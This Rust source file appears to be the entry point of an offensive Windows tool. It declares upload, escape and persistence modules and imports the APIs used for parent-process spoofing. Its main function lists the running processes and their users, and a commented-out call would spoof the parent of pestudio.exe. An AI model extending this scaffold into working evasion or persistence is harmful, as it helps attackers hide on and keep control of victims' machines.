//#![windows_subsystem = "windows"]

//not find better for now :)
#![allow(unused_imports)]
#![allow(dead_code)]

mod upload;
mod escape;
mod tools;
mod persistance;

use std::fs::File;

use std::io::Read;
use std::string::String;
use std::io::Write;


use std::mem;
use std::ptr::null_mut;
use winapi::ctypes::c_void;
use winapi::shared::basetsd::SIZE_T;
use winapi::um::heapapi::{GetProcessHeap, HeapAlloc};
use winapi::um::processthreadsapi::{
    CreateProcessA, InitializeProcThreadAttributeList, OpenProcess, UpdateProcThreadAttribute,PROCESS_INFORMATION,
};
use winapi::um::winbase::STARTUPINFOEXA;
use winapi::um::winnt::{HANDLE, LPSTR};

use sysinfo::{PidExt,Pid, ProcessExt, System, SystemExt};

fn main() {

    //let mut my_ppid = std::process::id();
    //println!("my pid : {}",my_ppid);
    let s = System::new_all();
    let mut ppid_list = Vec::<u32>::new();

    for (pid, process) in s.processes() {
       // my_ppid = process.pid().as_u32();
        if process.user_id().is_some(){
            ppid_list.push(pid.as_u32());
        }
        println!("{} {:?}", pid.as_u32(), process.user_id());
    }
    println!("my pid : {:?}",ppid_list);

    //escape::ppid_spoof(my_ppid, "C:\\temp\\pestudio\\pestudio.exe".to_string());

}

